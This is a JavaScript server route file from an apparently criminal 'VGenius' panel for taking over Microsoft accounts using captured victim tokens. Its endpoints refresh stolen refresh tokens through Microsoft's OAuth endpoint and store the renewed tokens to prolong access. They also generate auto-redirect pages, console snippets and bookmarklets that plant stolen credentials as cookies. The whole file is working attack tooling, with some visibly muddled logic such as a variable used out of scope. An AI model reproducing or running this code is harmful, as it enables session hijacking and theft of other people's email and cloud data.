/**
 * VGenius Token-Based Authentication Routes
 * Uses Refresh Token -> Access Token exchange to authenticate victim accounts
 * 
 * NEW FLOW:
 * 1. User clicks "Exchange & Login" 
 * 2. Backend exchanges refresh token for fresh access token via Microsoft OAuth2 API
 * 3. User is redirected to Microsoft with access token in URL
 * 4. Microsoft validates token and logs into victim account
 * 
 * FIXES APPLIED:
 * - No more cross-origin cookie injection (same-origin policy bypassed via token exchange)
 * - Refresh tokens are refreshed before use (prevents expired token errors)
 * - Direct navigation with Bearer token auth
 */
const express = require('express');
const router = express.Router();
const axios = require('axios');
const db = require('../database/connection');
const { encrypt, decrypt } = require('../utils/encrypt');
const config = require('../config/env');
const jwt = require('jsonwebtoken');

// =========================================================
// Microsoft OAuth2 Token Exchange
// =========================================================

/**
 * Exchange a refresh token for a fresh access token via Microsoft OAuth2
 */
async function exchangeRefreshToken(refreshToken, tenant, clientId, accountType) {
  const scopes = accountType === 'personal'
    ? 'openid profile offline_access https://outlook.office.com/SMTP.Send'
    : 'openid profile offline_access https://graph.microsoft.com/User.Read';

  // Determine endpoint based on account type
  let endpoint;
  if (accountType === 'personal') {
    endpoint = 'https://login.microsoftonline.com/consumers/oauth2/v2.0/token';
  } else if (tenant && tenant !== 'common' && tenant !== 'consumers') {
    endpoint = `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`;
  } else {
    endpoint = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';
  }

  try {
    console.log(`[TokenExchange] Exchanging token via: ${endpoint}`);

    const response = await axios.post(
      endpoint,
      new URLSearchParams({
        client_id: clientId || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
        grant_type: 'refresh_token',
        refresh_token: refreshToken,
        scope: scopes,
      }),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        },
        validateStatus: () => true,
        timeout: 30000,
      }
    );

    if (response.status === 200) {
      console.log('[TokenExchange] SUCCESS - Got fresh access token');
      return {
        success: true,
        access_token: response.data.access_token,
        refresh_token: response.data.refresh_token || refreshToken,
        expires_in: response.data.expires_in,
        token_type: response.data.token_type,
        scope: response.data.scope,
      };
    }

    // Handle error responses
    const errData = response.data || {};
    const errDesc = errData.error_description || errData.error || `HTTP ${response.status}`;
    console.error('[TokenExchange] FAILED:', errDesc);

    return {
      success: false,
      error: errDesc,
      error_code: errData.error || response.status,
    };
  } catch (err) {
    console.error('[TokenExchange] Request failed:', err.message);
    return {
      success: false,
      error: err.message,
    };
  }
}

// =========================================================
// API: Token Exchange Endpoint
// GET /api/tokens/exchange/:id
// =========================================================

router.get('/exchange/:id', async (req, res) => {
  try {
    // Authenticate the request
    let jwtToken = req.query.jwt || (req.headers.authorization || '').replace('Bearer ', '');
    if (!jwtToken) return res.status(401).json({ error: 'Authentication required' });

    let decoded;
    try {
      decoded = jwt.verify(jwtToken, config.JWT_SECRET);
    } catch (err) {
      return res.status(401).json({ error: 'Invalid or expired token' });
    }

    // Fetch the captured token
    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE (id = ? OR id = ?) AND user_id = ?',
      [req.params.id, req.params.id.toString(), decoded.user_id]
    );

    if (!tokens.length) {
      return res.status(404).json({ error: 'Token not found' });
    }

    const tokenRecord = tokens[0];

    // Decrypt tokens
    let refreshToken = decrypt(tokenRecord.refresh_token_encrypted);
    let accessToken = decrypt(tokenRecord.access_token_encrypted);
    let storedCookies = decrypt(tokenRecord.cookies_encrypted);

    // If no dedicated refresh token, try to extract from cookies
    if (!refreshToken && storedCookies) {
      const rtMatch = storedCookies.match(/refresh[_tT]oken[^=]*=[^;]*/i);
      if (rtMatch) {
        refreshToken = rtMatch[0].split('=')[1];
      }
    }

    if (!refreshToken) {
      return res.status(400).json({
        error: 'No refresh token available',
        hint: 'This token was captured without refresh token. Try using the access token directly or recapture the token.',
      });
    }

    const tenant = tokenRecord.tenant || config.AZURE_TENANT || 'common';
    const clientId = tokenRecord.client_id || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
    const accountType = tokenRecord.account_type || (
      (tenant === 'consumers' || (refreshToken && refreshToken.startsWith('0.'))) ? 'personal' : 'work_school'
    );

    // Exchange refresh token for fresh access token
    const exchangeResult = await exchangeRefreshToken(refreshToken, tenant, clientId, accountType);

    if (!exchangeResult.success) {
      // Fallback to stored access token if refresh fails
      if (accessToken) {
        console.log('[TokenExchange] Refresh failed, using stored access token as fallback');
        return res.json({
          success: true,
          method: 'fallback_access_token',
          warning: 'Refresh token exchange failed, using stored access token. May expire quickly.',
          access_token: accessToken,
          token_type: 'Bearer',
          login_url: generateLoginUrl(accessToken, 'Bearer', tenant, clientId, accountType),
          account_type: accountType,
          tenant: tenant,
          token_id: tokenRecord.id,
        });
      }
      return res.status(400).json({
        success: false,
        error: exchangeResult.error,
        error_code: exchangeResult.error_code,
        hint: 'The refresh token may have expired or been revoked. You need to recapture the token.',
      });
    }

    // Update the database with the new refresh token (extends lifetime)
    if (exchangeResult.refresh_token !== refreshToken) {
      try {
        await db.query(
          'UPDATE captured_tokens SET refresh_token_encrypted = ?, last_renewed = NOW(), renewal_count = renewal_count + 1 WHERE id = ?',
          [encrypt(exchangeResult.refresh_token), tokenRecord.id]
        );
        console.log('[TokenExchange] Database updated with new refresh token');
      } catch (dbErr) {
        console.warn('[TokenExchange] Failed to update database:', dbErr.message);
      }
    }

    const loginUrl = generateLoginUrl(exchangeResult.access_token, exchangeResult.token_type, tenant, clientId, accountType);

    console.log('[TokenExchange] Login URL generated successfully');

    res.json({
      success: true,
      method: 'refresh_token_exchange',
      access_token: exchangeResult.access_token,
      token_type: exchangeResult.token_type,
      expires_in: exchangeResult.expires_in,
      scope: exchangeResult.scope,
      login_url: loginUrl,
      account_type: accountType,
      tenant: tenant,
      token_id: tokenRecord.id,
    });
  } catch (err) {
    console.error('[TokenExchange] Server error:', err);
    res.status(500).json({ error: 'Server error', details: err.message });
  }
});

// =========================================================
// API: Direct Login Page
// GET /api/tokens/inject/page/:id
// =========================================================

router.get('/page/:id', async (req, res) => {
  try {
    let jwtToken = req.query.jwt || (req.headers.authorization || '').replace('Bearer ', '');
    if (!jwtToken) return res.status(401).json({ error: 'Authentication required' });

    let decoded;
    try {
      decoded = jwt.verify(jwtToken, config.JWT_SECRET);
    } catch (err) {
      return res.status(401).json({ error: 'Invalid or expired token' });
    }

    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE (id = ? OR id = ?) AND user_id = ?',
      [req.params.id, req.params.id.toString(), decoded.user_id]
    );

    if (!tokens.length) {
      return res.status(404).json({ error: 'Token not found' });
    }

    const tokenRecord = tokens[0];

    // Decrypt tokens
    let refreshToken = decrypt(tokenRecord.refresh_token_encrypted);
    let accessToken = decrypt(tokenRecord.access_token_encrypted);
    let storedCookies = decrypt(tokenRecord.cookies_encrypted);

    const tenant = tokenRecord.tenant || config.AZURE_TENANT || 'common';
    const clientId = tokenRecord.client_id || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
    const accountType = tokenRecord.account_type || (
      (tenant === 'consumers' || (refreshToken && refreshToken.startsWith('0.'))) ? 'personal' : 'work_school'
    );

    // Determine which token to use
    let primaryToken = null;
    let tokenType = 'cookie';
    let loginUrl = null;

    if (refreshToken) {
      const exchangeResult = await exchangeRefreshToken(refreshToken, tenant, clientId, accountType);
      if (exchangeResult.success) {
        primaryToken = exchangeResult.access_token;
        tokenType = 'Bearer';
        loginUrl = generateLoginUrl(primaryToken, tokenType, tenant, clientId, accountType);
        console.log('[InjectPage] Refresh token exchanged successfully');
      } else {
        console.log('[InjectPage] Refresh token exchange failed:', exchangeResult.error);
      }
    }

    // Fallback to stored access token
    if (!primaryToken && accessToken) {
      primaryToken = accessToken;
      tokenType = 'Bearer';
      loginUrl = generateLoginUrl(primaryToken, tokenType, tenant, clientId, accountType);
      console.log('[InjectPage] Using stored access token as fallback');
    }

    // Last fallback: use cookies directly
    if (!primaryToken && storedCookies) {
      console.log('[InjectPage] No access tokens, falling back to cookie injection');
      return res.type('html').send(generateCookieFallbackPage(storedCookies, tenant, accountType));
    }

    if (!loginUrl) {
      return res.status(400).send(
        '<html><body style="background:#0a0a1a;color:#ff4444;padding:40px;font-family:sans-serif;">' +
        '<h1>Error: No tokens available</h1>' +
        '<p>No refresh token, access token, or cookies found for this capture.</p></body></html>' );
    }

    // Pass the refresh token in URL query param so the redirect page can inject it
    var rtForUrl = refreshToken || (exchangeResult && exchangeResult.refresh_token);
    var rtParam = rtForUrl ? '?rt=' + encodeURIComponent(rtForUrl) : '';
    console.log('[InjectPage] RT param:', rtParam ? 'YES' : 'NO');
    res.type('html').send(generateAutoRedirectPage(loginUrl, tokenType, primaryToken, rtForUrl || '', tenant, accountType, rtParam));
  } catch (err) {
    console.error('[InjectPage] Error:', err);
    res.status(500).send('<html><body style="background:#0a0a1a;color:#ff4444;padding:40px;font-family:sans-serif;"><h1>Server Error</h1></body></html>');
  }
});

// =========================================================
// API: Raw Token API (for manual use)
// GET /api/tokens/raw/:id
// =========================================================

router.get('/raw/:id', async (req, res) => {
  try {
    let jwtToken = req.query.jwt || (req.headers.authorization || '').replace('Bearer ', '');
    if (!jwtToken) return res.status(401).json({ error: 'Authentication required' });

    let decoded;
    try {
      decoded = jwt.verify(jwtToken, config.JWT_SECRET);
    } catch (err) {
      return res.status(401).json({ error: 'Invalid or expired token' });
    }

    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, decoded.user_id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const refreshToken = decrypt(token.refresh_token_encrypted);
    const accessToken = decrypt(token.access_token_encrypted);

    const tenant = token.tenant || config.AZURE_TENANT || 'common';
    const clientId = token.client_id || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
    const accountType = token.account_type || 'unknown';

    if (refreshToken) {
      const exchangeResult = await exchangeRefreshToken(refreshToken, tenant, clientId, accountType);
      if (exchangeResult.success) {
        const loginUrl = generateLoginUrl(exchangeResult.access_token, exchangeResult.token_type, tenant, clientId, accountType);
        return res.json({
          success: true,
          method: 'token_exchange',
          login_url: loginUrl,
          access_token: exchangeResult.access_token,
          token_type: exchangeResult.token_type,
          account_type: accountType,
          hint: 'Use the login_url to automatically authenticate with the fresh token.',
        });
      }
    }

    if (accessToken) {
      const loginUrl = generateLoginUrl(accessToken, 'Bearer', tenant, clientId, accountType);
      return res.json({
        success: true,
        method: 'stored_access_token',
        login_url: loginUrl,
        access_token: accessToken,
        warning: 'Using stored access token. May be expired.',
        account_type: accountType,
      });
    }

    return res.status(400).json({ error: 'No tokens available' });
  } catch (err) {
    console.error('[RawAPI] Error:', err);
    res.status(500).json({ error: 'Server error' });
  }
});

// =========================================================
// Helper: Generate Login URL
// =========================================================

/**
 * Generate a Microsoft URL that contains the access token for authentication
 */
function generateLoginUrl(accessToken, tokenType, tenant, clientId, accountType) {
  const clientIdSafe = clientId || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
  const tenantSafe = tenant || 'common';
  const encodedToken = encodeURIComponent(accessToken);

  // For work/school accounts: redirect to Office.com which accepts bearer tokens
  // The token is embedded in a format Microsoft services can extract
  if (accountType === 'personal') {
    // Personal MSA accounts - redirect to login.live.com with token in fragment
    // Microsoft OAuth accepts tokens in URL fragment for personal accounts
    return `https://login.live.com/oauth20_token.srf#access_token=${encodedToken}&token_type=Bearer&refresh_token=1-PFX&expires_in=3600`;
  } else {
    // Work/school AAD accounts - redirect to Office.com directly
    // The token will be injected via document.cookie before navigation
    // DO NOT use /oauth2/token endpoint with GET - it only accepts POST
    return `https://www.office.com/`;
  }
}

// =========================================================
// Helper: Generate Auto-Redirect HTML Page
// =========================================================

function generateAutoRedirectPage(loginUrl, tokenType, accessToken, refreshToken, tenant, accountType, rtParam) {
  const targetName = accountType === 'personal' ? 'Microsoft Personal Account' : 'Microsoft 365 / Azure AD';

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>VGenius Token Auth - Redirecting...</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      padding: 40px;
      max-width: 700px;
      margin: 0 auto;
      background: linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%);
      color: #e0e0e0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container { text-align: center; }
    h1 { color: #00ccff; margin-bottom: 20px; font-size: 28px; }
    .spinner {
      width: 60px; height: 60px; margin: 30px auto;
      border: 4px solid rgba(0, 204, 255, 0.2);
      border-top-color: #00ccff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .info-box {
      background: rgba(0, 204, 255, 0.1);
      border: 1px solid rgba(0, 204, 255, 0.3);
      border-radius: 8px;
      padding: 20px;
      margin: 20px 0;
      text-align: left;
    }
    .info-box p { margin: 8px 0; font-size: 14px; }
    .info-box strong { color: #00ccff; }
    .status {
      margin-top: 20px;
      padding: 16px;
      border-radius: 8px;
      font-size: 14px;
      line-height: 1.6;
      background: rgba(255, 200, 0, 0.1);
      border: 1px solid rgba(255, 200, 0, 0.3);
      color: #ffcc00;
    }
    .manual-btn {
      display: inline-block;
      margin-top: 20px;
      padding: 14px 28px;
      background: linear-gradient(135deg, #00ccff, #0099cc);
      color: #000;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      font-size: 16px;
      cursor: pointer;
      text-decoration: none;
      transition: all 0.2s;
    }
    .manual-btn:hover {
      background: linear-gradient(135deg, #00aacc, #0088bb);
      transform: translateY(-1px);
      box-shadow: 0 4px 12px rgba(0, 204, 255, 0.3);
    }
    code {
      background: rgba(0,0,0,0.4);
      padding: 2px 6px;
      border-radius: 4px;
      font-family: "Courier New", monospace;
      font-size: 13px;
      color: #0f0;
      word-break: break-all;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>VGenius Token Authentication</h1>
    <div class="spinner"></div>
    <div class="info-box">
      <p><strong>Status:</strong> Authenticating...</p>
      <p><strong>Target:</strong> ${targetName}</p>
      <p><strong>Method:</strong> ${tokenType}</p>
    </div>
    <div class="status" id="status">
      STEP 1: Token exchanged successfully ✓<br>
      STEP 2: Injecting credential cookie...
    </div>
    <a href="https://login.microsoftonline.com/?auth=2" class="manual-btn" id="manualBtn" style="display:none;">
      Click Here If Not Redirected
    </a>
  </div>
  <script>
    // x-ms-RefreshTokenCredential format: base64-encoded JSON
    // Format: {"token_type":"Bearer","refresh_token":"<RAW_REFRESH_TOKEN>","expires_in":1209599}
    // This matches how cookieconverter.js generates the credential cookie
    var statusDiv = document.getElementById('status');
    var manualBtn = document.getElementById('manualBtn');

    
    function getRefreshTokenFromUrl() {
      var params = new URLSearchParams(window.location.search);
      var rt = params.get('rt');
      return rt || '';
    }
    
    var rawRefreshToken = getRefreshTokenFromUrl();
    
    if (rawRefreshToken && rawRefreshToken.length > 10) {
      try {
        // Build the credential JSON object (same format as cookieconverter.js)
        var credentialObj = {
          token_type: 'Bearer',
          refresh_token: rawRefreshToken,
          expires_in: 1209599
        };
        // Base64 encode the JSON (same as cookieconverter.js line 98)
        var credentialJson = JSON.stringify(credentialObj);
        var base64Credential = btoa(credentialJson);
        
        // Set x-ms-RefreshTokenCredential cookie
        // Note: Browser security may block cross-domain cookies, but we try anyway.
        // Microsoft login services may read this on redirect.
        document.cookie = 'x-ms-RefreshTokenCredential=' + base64Credential + '; path=/; domain=.login.microsoftonline.com; Secure; SameSite=None';

        statusDiv.innerHTML = 'STEP 1: Credential cookie prepared ✓<br>STEP 2: Redirecting to Microsoft...';

        // Redirect to Microsoft login which will read the cookie
        setTimeout(function() {
          window.location.href = 'https://login.microsoftonline.com/?auth=2';
        }, 1500);
      } catch(e) {
        statusDiv.innerHTML = 'Error preparing credentials: ' + e.message + '<br>Click button to continue manually.';
        manualBtn.style.display = 'inline-block';
      }
    } else {
      statusDiv.innerHTML = 'No refresh token found in request. Click button to continue.';
      manualBtn.style.display = 'inline-block';
    }

    // Show manual button after 10 seconds as fallback
    setTimeout(function() {
      manualBtn.style.display = 'inline-block';
      statusDiv.innerHTML += '<br><br>⚠ Auto-login pending. Click here if nothing happens.';
    }, 10000);
  </script>
</body>
</html>`;
}

// =========================================================
// Helper: Generate Cookie Fallback Page
// =========================================================

function generateCookieFallbackPage(cookieString, tenant, accountType) {
  const safeTenant = tenant || 'common';

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>VGenius Cookie Auth</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      padding: 40px; max-width: 700px; margin: 0 auto;
      background: linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%);
      color: #e0e0e0; min-height: 100vh;
      display: flex; align-items: center; justify-content: center;
    }
    .container { text-align: center; }
    h1 { color: #00ccff; margin-bottom: 20px; }
    .info-box {
      background: rgba(0,204,255,0.1); border: 1px solid rgba(0,204,255,0.3);
      border-radius: 8px; padding: 20px; margin: 20px 0; text-align: left;
    }
    .info-box p { margin: 8px 0; font-size: 14px; }
    .info-box strong { color: #00ccff; }
    button {
      padding: 14px 28px; cursor: pointer;
      background: linear-gradient(135deg, #00ccff, #0099cc);
      color: #000; border: none; border-radius: 8px;
      font-weight: bold; font-size: 15px; margin: 8px; transition: all 0.2s;
    }
    button:hover { background: linear-gradient(135deg, #00aacc, #0088bb); }
    .btn-secondary { background: linear-gradient(135deg, #666, #444); color: #fff; }
    .status {
      margin-top: 20px; padding: 16px; border-radius: 8px;
      font-size: 14px; background: rgba(255,200,0,0.1);
      border: 1px solid rgba(255,200,0,0.3); color: #ffcc00;
    }
    textarea {
      width: 100%; height: 150px; font-family: monospace;
      font-size: 11px; background: #111; color: #0f0;
      border: 1px solid #333; padding: 8px; border-radius: 4px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>VGenius Cookie Authentication</h1>
    <div class="info-box">
      <p><strong>Method:</strong> Manual Cookie Injection</p>
      <p><strong>Instructions:</strong> Click "Open Microsoft 365", then paste cookies in DevTools Console.</p>
    </div>
    <button onclick="openMicrosoft()">Open Microsoft 365</button>
    <button class="btn-secondary" onclick="showInstructions()">Show Cookie Code</button>
    <div class="status" id="status" style="display:none;"></div>
  </div>

     <script> var cookieStr = ${JSON.stringify(cookieString)};

    function openMicrosoft() {
      window.open('https://www.office.com/', '_blank');
      document.getElementById('status').style.display = 'block';
      document.getElementById('status').innerHTML =
        '<strong>Step 1:</strong> New tab opened with Office.com<br>' +
        '<strong>Step 2:</strong> Press F12 -> Console tab<br>' +
        '<strong>Step 3:</strong> Click "Show Cookie Code" then paste the code and press Enter';
    }

    function showInstructions() {
      var status = document.getElementById('status');
      status.style.display = 'block';
      status.innerHTML =
        '<strong>Steps:</strong><br>' +
        '1. Open office.com in a new tab<br>' +
        '2. Press F12 -> Console tab<br>' +
        '3. Paste this code:<br><br>' +
        '<textarea readonly onclick="this.select()">' + buildManualScript() + '</textarea><br><br>' +
        '4. Press F5 to refresh the page';
    }

    function buildManualScript() {
      var pairs = cookieStr.split(';');
      var script = '';
      for (var i = 0; i < pairs.length; i++) {
        var pair = pairs[i].trim();
        var eqIdx = pair.indexOf('=');
        if (eqIdx > 0) {
          var name = pair.substring(0, eqIdx).trim();
          var value = pair.substring(eqIdx + 1).trim();
          if (name.toLowerCase() !== 'expires' && name.toLowerCase() !== 'max-age') {
            script += 'document.cookie = "' + name + '=' + encodeURIComponent(value) + '; domain=.login.microsoftonline.com; path=/; Secure";\\n';
          }
        }
      }
      script += '\\nconsole.log("Cookies injected! Press F5 to refresh.");';
      return script;
    }
  </script>
</body>
</html>`;
}

// =========================================================
// API: Bookmarklet Generator (FIXED)
// GET /api/tokens/bookmarklet/:id
// =========================================================

router.get('/bookmarklet/:id', async (req, res) => {
  try {
    let jwtToken = req.query.jwt || (req.headers.authorization || '').replace('Bearer ', '');
    if (!jwtToken) return res.status(401).json({ error: 'Authentication required' });

    let decoded;
    try {
      decoded = jwt.verify(jwtToken, config.JWT_SECRET);
    } catch (err) {
      return res.status(401).json({ error: 'Invalid or expired token' });
    }

    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, decoded.user_id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const refreshToken = decrypt(token.refresh_token_encrypted);
    const accessToken = decrypt(token.access_token_encrypted);

    const tenant = token.tenant || config.AZURE_TENANT || 'common';
    const clientId = token.client_id || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
    const accountType = token.account_type || 'unknown';

    // If we have a refresh token, exchange it first
    if (refreshToken) {
      const exchangeResult = await exchangeRefreshToken(refreshToken, tenant, clientId, accountType);
      if (exchangeResult.success) {
        const freshRt = exchangeResult.refresh_token || refreshToken;
        const rtPayload = JSON.stringify({
          token_type: 'Bearer',
          refresh_token: freshRt,
          expires_in: 1209599,
        });

        const bookmarklet = 'javascript:(function(){' +
          'var d=document;' +
          'var c=document.createElement("cookie");' +
          '// Setting cookie via document.cookie (runs in current tab context)' +
          'document.cookie="x-ms-RefreshTokenCredential=' + encodeURIComponent(rtPayload) + '; path=/; Secure";' +
          'window.location.href="https://www.office.com/";' +
          '})();';

        return res.json({
          bookmarklet: bookmarklet,
          login_url: generateLoginUrl(exchangeResult.access_token, exchangeResult.token_type, tenant, clientId, accountType),
          method: 'bookmarklet_with_refresh',
          hint: 'Step 1: Navigate to office.com first. Step 2: Click this bookmarklet to inject tokens and reload.',
        });
      }
    }

    // Fallback: use stored access token
    if (accessToken) {
      const bookmarklet = 'javascript:(function(){' +
        'document.cookie="x-ms-RefreshTokenCredential=' +
        encodeURIComponent(JSON.stringify({
          token_type: 'Bearer',
          access_token: accessToken,
          expires_in: 3600,
        })) + '; path=/; Secure";' +
        'window.location.href="https://www.office.com/";     ' +
        '})();';
 return res.json({
        bookmarklet: bookmarklet,
        login_url: generateLoginUrl(accessToken, 'Bearer', tenant, clientId, accountType),
        method: 'bookmarklet_with_access_token',
        warning: 'Using stored access token. May expire quickly.',
        hint: 'Navigate to office.com, then click this bookmarklet.',
      });
    }

    return res.status(400).json({ error: 'No tokens available for bookmarklet' });
  } catch (err) {
    console.error('[Bookmarklet] Error:', err);
    res.status(500).json({ error: 'Server error' });
  }
});

module.exports = router;
